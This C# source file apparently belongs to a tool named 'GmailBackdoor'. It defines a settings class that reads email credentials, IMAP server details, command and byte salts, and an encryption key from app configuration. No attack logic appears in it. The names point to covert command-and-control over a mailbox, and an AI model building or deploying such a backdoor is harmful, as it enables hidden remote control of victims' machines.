using System;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GmailBackdoor
{
    public class SettingsManager
    {
        private static SettingsManager _settingsManager = null;

        public static SettingsManager Get
        {
            get
            {
                if (_settingsManager == null)
                    _settingsManager = new SettingsManager();

                return _settingsManager;
            }
        }

        public SettingsManager()
        {
        }

        public string SenderEmailAddress
        {
            get
            {
                try
                {
                    var appSettings = ConfigurationManager.AppSettings;
                    string result = appSettings["SenderEmail"] ?? string.Empty;
                    return result;
                }
                catch
                {

                }
                return string.Empty;
            }
        }

        public string SenderPassword
        {
            get
            {
                try
                {
                    var appSettings = ConfigurationManager.AppSettings;
                    string result = appSettings["SenderPassword"] ?? string.Empty;
                    return result;
                }
                catch
                {

                }
                return string.Empty;
            }
        }

        public string ServerEmailAddress
        {
            get
            {
                try
                {
                    var appSettings = ConfigurationManager.AppSettings;
                    string result = appSettings["ServerEmail"] ?? string.Empty;
                    return result;
                }
                catch
                {

                }
                return string.Empty;
            }
        }

        public string ServerPassword
        {
            get
            {
                try
                {
                    var appSettings = ConfigurationManager.AppSettings;
                    string result = appSettings["ServerPassword"] ?? string.Empty;
                    return result;
                }
                catch
                {

                }
                return string.Empty;
            }
        }

        public int ImapPort
        {
            get
            {
                try
                {
                    var appSettings = ConfigurationManager.AppSettings;
                    string result = appSettings["ImapPort"] ?? string.Empty;
                    if (result == string.Empty)
                    {
                        return 993;
                    }

                    return int.Parse(result);
                }
                catch
                {

                }
                return 993;
            }
        }

        public string ImapServer
        {
            get
            {
                try
                {
                    var appSettings = ConfigurationManager.AppSettings;
                    string result = appSettings["ImapServer"] ?? string.Empty;
                    return result;
                }
                catch
                {

                }
                return string.Empty;
            }
        }

        public string CmdSalt
        {
            get
            {
                try
                {
                    var appSettings = ConfigurationManager.AppSettings;
                    string result = appSettings["CmdSalt"] ?? string.Empty;
                    return result;
                }
                catch
                {

                }
                return string.Empty;
            }
        }

        public string ByteSalt
        {
            get
            {
                try
                {
                    var appSettings = ConfigurationManager.AppSettings;
                    string result = appSettings["ByteSalt"] ?? string.Empty;
                    return result;
                }
                catch
                {

                }
                return string.Empty;
            }
        }

        public string EncrptKey
        {
            get
            {
                try
                {
                    var appSettings = ConfigurationManager.AppSettings;
                    string result = appSettings["EncrptKey"] ?? string.Empty;
                    return result;
                }
                catch
                {

                }
                return string.Empty;
            }
        }
    }
}
